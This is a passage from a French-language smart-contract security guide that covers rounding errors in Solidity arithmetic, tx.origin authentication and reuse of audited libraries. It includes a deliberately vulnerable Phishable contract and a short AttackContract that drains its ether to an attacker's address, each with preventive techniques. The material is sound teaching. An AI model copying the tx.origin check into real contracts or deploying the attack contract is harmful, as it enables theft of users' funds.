        // convertit wei en eth, puis multiplie par le taux de jeton
        uint tokens = msg.value/weiPerEth*tokensPerEth;
        balances[msg.sender] += tokens;
    }

    function sellTokens(uint tokens) public {
        require(balances[msg.sender] &gt;= tokens);
        uint eth = tokens/tokensPerEth;
        balances[msg.sender] -= tokens;
        msg.sender.transfer(eth*weiPerEth);
    }
}</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Ce simple contrat d&#8217;achat/vente de jetons présente des problèmes évidents. Bien que les calculs mathématiques pour l&#8217;achat et la vente de jetons soient corrects, l&#8217;absence de nombres à virgule flottante donnera des résultats erronés. Par exemple, lors de l&#8217;achat de jetons sur la ligne 8, si la valeur est inférieure à <code>1 ether</code>, la division initiale donnera <code>0</code>, laissant le résultat de la multiplication finale à <code>0</code> (par exemple, <code>200 wei</code> divisé par <code>1e18</code> <code>weiPerEth</code> est égal à <code>0</code>). De même, lors de la vente de jetons, tout nombre de jetons inférieur à <code>10</code> entraînera également <code>0 ether</code>. En fait, l&#8217;arrondi ici est toujours inférieur, donc la vente de <code>29 jetons</code> se traduira par <code>2 ether</code>.</p>
</div>
<div class="paragraph">
<p>Le problème avec ce contrat est que la précision n&#8217;est qu&#8217;à l&#8217;ether le plus proche (c&#8217;est-à-dire 1e18 wei ). Cela peut devenir délicat lorsqu&#8217;il s&#8217;agit de décimales dans les jetons <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> lorsque vous avez besoin d&#8217;une plus grande précision.</p>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_15">Techniques préventives</h4>
<div class="paragraph">
<p>Garder la bonne précision dans vos contrats intelligents est très important, en particulier lorsqu&#8217;il s&#8217;agit de ratios et de taux qui reflètent des décisions économiques.</p>
</div>
<div class="paragraph">
<p>Vous devez vous assurer que tous les ratios ou taux que vous utilisez permettent de grands numérateurs dans les fractions. Par exemple, nous avons utilisé le taux <code>tokensPerEth</code> dans notre exemple. Il aurait été préférable d&#8217;utiliser <code>weiPerTokens</code>, qui serait un grand nombre. Pour calculer le nombre correspondant de jetons, nous pourrions faire <code>msg.value/weiPerTokens</code>. Cela donnerait un résultat plus précis.</p>
</div>
<div class="paragraph">
<p>Une autre tactique à garder à l&#8217;esprit est l&#8217;ordre des opérations. Dans notre exemple, le calcul pour acheter des jetons était <code>msg.value/weiPerEth*tokenPerEth</code>. Notez que la division se produit avant la multiplication. (Solidity, contrairement à certains langages, garantit d&#8217;effectuer les opérations dans l&#8217;ordre dans lequel elles sont écrites.) Cet exemple aurait atteint une plus grande précision si le calcul effectuait d&#8217;abord la multiplication puis la division; c&#8217;est-à-dire <code>msg.value*tokenPerEth/weiPerEth</code>.</p>
</div>
<div class="paragraph">
<p>Enfin, lors de la définition d&#8217;une précision arbitraire pour les nombres, il peut être judicieux de convertir les valeurs en une précision supérieure, d&#8217;effectuer toutes les opérations mathématiques, puis de les reconvertir finalement à la précision requise pour la sortie. Généralement, les <code>uint256</code> sont utilisés (car ils sont optimaux pour l&#8217;utilisation du gaz); ceux-ci donnent environ 60 ordres de grandeur dans leur gamme, dont certains peuvent être dédiés à la précision des opérations mathématiques. Il se peut qu&#8217;il soit préférable de conserver toutes les variables en haute précision dans Solidity et de les reconvertir en précisions inférieures dans les applications externes (c&#8217;est essentiellement ainsi que fonctionne la variable décimale dans les contrats de jeton ERC20). Pour voir un exemple de la façon dont cela peut être fait, nous vous recommandons de regarder <a href="https://github.com/dapphub/ds-math">DS-Math</a>. Il utilise des noms funky ("wads" et "rays"), mais le concept est utile.</p>
</div>
</div>
<div class="sect3">
<h4 id="_exemple_concret_ethstick">Exemple concret : Ethstick</h4>
<div class="paragraph">
<p>Le <a href="http://bit.ly/2Qb7PSB"><code>contrat Ethstick</code></a>n&#8217;utilise pas la précision étendue; cependant, il traite de wei. Donc, ce contrat aura des problèmes d&#8217;arrondi, mais seulement au niveau de précision wei. Il a quelques défauts plus graves, mais ceux-ci sont liés à la difficulté d&#8217;obtenir de l&#8217;entropie sur la chaîne de blocs (voir <a href="#entropyillusion_security">Illusion d&#8217;entropie</a>). Pour une discussion plus approfondie du contrat Ethstick, nous vous renverrons à un autre article de Peter Vessenes, <a href="http://bit.ly/2SwDnE0">"Les contrats Ethereum vont être des bonbons pour les pirates"</a>.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_authentification_tx_origin">Authentification Tx.Origin</h3>
<div class="paragraph">
<p>Solidity a une variable globale, <code>tx.origin</code>, qui parcourt toute la pile d&#8217;appels et contient l&#8217;adresse du compte qui a initialement envoyé l&#8217;appel (ou la transaction). L&#8217;utilisation de cette variable pour l&#8217;authentification dans un contrat intelligent rend le contrat vulnérable à une attaque de type hameçonnage.</p>
</div>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<div class="title">Note</div>
</td>
<td class="content">
<div class="paragraph">
<p>Pour en savoir plus, consultez la question Ethereum sur <a href="http://bit.ly/2PxU1UM">Stack Exchange de dbryson</a> , <a href="http://bit.ly/2qm7ocJ">"Tx.Origin and Ethereum Oh My!"</a> de Peter Vessenes et <a href="http://bit.ly/2P3KVA4">"Solidity : Tx Origin Attacks"</a> de Chris Coverdale.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_16">La vulnérabilité</h4>
<div class="paragraph">
<p>Les contrats qui autorisent les utilisateurs à utiliser la variable <code>tx.origin</code> sont généralement vulnérables aux attaques de phishing qui peuvent inciter les utilisateurs à effectuer des actions authentifiées sur le contrat vulnérable. Considérez le contrat simple dans <a href="#phishable_security">Phishable.sol</a>.</p>
</div>
<div id="phishable_security" class="exampleblock">
<div class="title">Example 13. Phishable.sol</div>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract Phishable {
    address public owner;

    constructor (address _owner) {
        owner = _owner;
    }

    function () external payable {} // recevoir ether

    function withdrawAll(address _recipient) public {
        require(tx.origin == owner);
        _recipient.transfer(this.balance);
    }
}</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Notez qu&#8217;à la ligne 11 le contrat autorise la fonction <code>withdrawAll</code> en utilisant <code>tx.origin</code>. Ce contrat permet à un attaquant de créer un contrat d&#8217;attaque de la forme :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">import "Phishable.sol";

contract AttackContract {

    Phishable phishableContract;
    address attacker; // L'adresse de l'attaquant pour recevoir les fonds

    constructor (Phishable _phishableContract, address _attackerAddress) {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    function () payable {
        phishableContract.withdrawAll(attacker);
    }
}</code></pre>
</div>
</div>
<div class="paragraph">
<p>L&#8217;attaquant pourrait déguiser ce contrat en sa propre adresse privée et organiser socialement la victime (le propriétaire du contrat Phishable ) pour envoyer une forme de transaction à l&#8217;adresse, peut-être en envoyant ce contrat une certaine quantité d&#8217;ether. La victime, à moins d&#8217;être prudente, peut ne pas remarquer qu&#8217;il y a du code à l&#8217;adresse de l&#8217;attaquant, ou l&#8217;attaquant peut le faire passer pour un portefeuille multisignature ou un portefeuille de stockage avancé (rappelez-vous que le code source des contrats publics n&#8217;est pas disponible par défaut) .</p>
</div>
<div class="paragraph">
<p>Dans tous les cas, si la victime envoie une transaction avec suffisamment de gaz à l' adresse <code>AttackContract</code>, elle invoquera la fonction de secours, qui à son tour appellera la fonction <code>withdrawAll</code> du contrat <code>Phishable</code> avec le paramètre <code>attacker</code>. Cela entraînera le retrait de tous les fonds du contrat <code>Phishable</code> à l&#8217;adresse de l' attaquant <code>attacker</code>. C&#8217;est parce que l&#8217;adresse qui a initialement initialisé l&#8217;appel était la victime (c&#8217;est-à-dire le propriétaire du contrat <code>Phishable</code>). Par conséquent, <code>tx.origin</code> sera égal à <code>owner</code> et l' exigence <code>require</code> à la ligne 11 du contrat <code>Phishable</code> passera.</p>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_16">Techniques préventives</h4>
<div class="paragraph">
<p><code>tx.origin</code> ne doit pas être utilisé pour l&#8217;autorisation dans les contrats intelligents. Cela ne veut pas dire que la variable <code>tx.origin</code> ne doit jamais être utilisée. Il existe des cas d&#8217;utilisation légitimes dans les contrats intelligents. Par exemple, si l&#8217;on voulait empêcher les contrats externes d&#8217;appeler le contrat actuel, on pourrait implémenter un <code>require</code> de la forme <code>require(tx.origin==msg.sender)</code>. Cela empêche l&#8217;utilisation de contrats intermédiaires pour appeler le contrat en cours, limitant le contrat à des adresses sans code régulier.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="contract_libraries_sec">Contrats de bibliothèques</h3>
<div class="paragraph">
<p>De nombreux codes existants sont disponibles pour être réutilisés, à la fois déployés en chaîne en tant que bibliothèques appelables et hors chaîne en tant que bibliothèques de modèles de code. Les bibliothèques sur plate-forme, ayant été déployées, existent sous forme de contrats intelligents en code intermédiaire (bytecode), il faut donc faire très attention avant de les utiliser en production. Cependant, l&#8217;utilisation de bibliothèques sur plate-forme existantes bien établies présente de nombreux avantages, tels que la possibilité de bénéficier des dernières mises à jour, et vous permet d&#8217;économiser de l&#8217;argent et profite à l&#8217;écosystème Ethereum en réduisant le nombre total de contrats en direct dans Ethereum.</p>
</div>
<div class="paragraph">
<p>Dans Ethereum, la ressource la plus largement utilisée est la <a href="https://openzeppelin.org/">suite OpenZeppelin</a>, une vaste bibliothèque de contrats allant des implémentations de jetons ERC20 et ERC721, à de nombreuses variantes de modèles de crowdsale , en passant par des comportements simples couramment trouvés dans les contrats, tels que <code>Ownable</code>, <code>Pausable</code> ou <code>LimitBalance</code>. Les contrats de ce référentiel ont été largement testés et, dans certains cas, fonctionnent même comme des implémentations standard <em>de facto .</em> Ils sont libres d' utilisation et sont construits et maintenus par <a href="https://zeppelin.solutions">Zeppelin</a> avec une liste sans cesse croissante de contributeurs externes.</p>
</div>
<div class="paragraph">
<p>Également de Zeppelin est <a href="https://zeppelinos.org/">ZeppelinOS</a>, une plate-forme à source libre de services et d&#8217;outils pour développer et gérer en toute sécurité des applications de contrat intelligent. ZeppelinOS fournit une couche au-dessus de l&#8217;EVM qui permet aux développeurs de lancer facilement des DApps évolutives liées à une bibliothèque en chaîne de contrats bien testés qui sont eux-mêmes évolutifs. Différentes versions de ces bibliothèques peuvent coexister sur la plate-forme Ethereum, et un système de caution permet aux utilisateurs de proposer ou de pousser des améliorations dans différentes directions. Un ensemble d&#8217;outils hors chaîne pour déboguer, tester, déployer et surveiller les applications décentralisées est également fourni par la plate-forme.</p>
</div>
<div class="paragraph">
<p>Le projet ethpm vise à organiser les différentes ressources qui se développent dans l&#8217;écosystème en proposant un système de gestion de packages. En tant que tel, leur registre fournit plus d&#8217;exemples à parcourir :</p>
</div>
<div class="ulist">
<ul>
<li>
<p>Site Web : <a href="https://www.ethpm.com/">https://www.ethpm.com/</a></p>
</li>
<li>
<p>Lien vers le référentiel : <a href="https://www.ethpm.com/registry">https://www.ethpm.com/registry</a></p>
</li>
<li>
<p>Lien GitHub : <a href="https://github.com/ethpm">https://github.com/ethpm</a></p>
</li>
<li>
<p>Documentation : <a href="https://www.ethpm.com/docs/integration-guide">https://www.ethpm.com/docs/integration-guide</a></p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_conclusion">Conclusion</h3>
<div class="paragraph">
<p>Tout développeur travaillant dans le domaine des contrats intelligents a beaucoup à savoir et à comprendre. En suivant les meilleures pratiques dans la conception de votre contrat intelligent et la rédaction de votre code, vous éviterez de nombreux pièges et attrappes.</p>
</div>
<div class="paragraph">
<p>Le principe de sécurité logicielle le plus fondamental est peut-être de maximiser la réutilisation du code de confiance. En cryptographie, c&#8217;est si important qu&#8217;il a été condensé en un adage : "Ne lancez pas votre propre crypto." Dans le cas des contrats intelligents, cela revient à tirer le meilleur parti possible des bibliothèques librement disponibles qui ont été soigneusement contrôlées par la communauté.</p>
</div>
</div>
</div>
</div>
</div>
<div id="footer">
<div id="footer-text">
Last updated 2022-05-15 04:37:22 -0400
</div>
</div>
</body>
</html>